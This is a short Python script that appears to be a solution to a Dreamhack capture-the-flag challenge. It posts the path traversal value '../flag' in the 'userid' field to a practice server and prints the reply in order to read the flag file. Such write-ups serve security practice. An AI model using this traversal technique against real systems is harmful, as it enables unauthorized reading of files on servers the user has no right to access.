import requests

host = "http://host3.dreamhack.games:14296/get_info"

data = {"userid":"../flag"}

res = requests.post(host, data=data)

print(res.text)
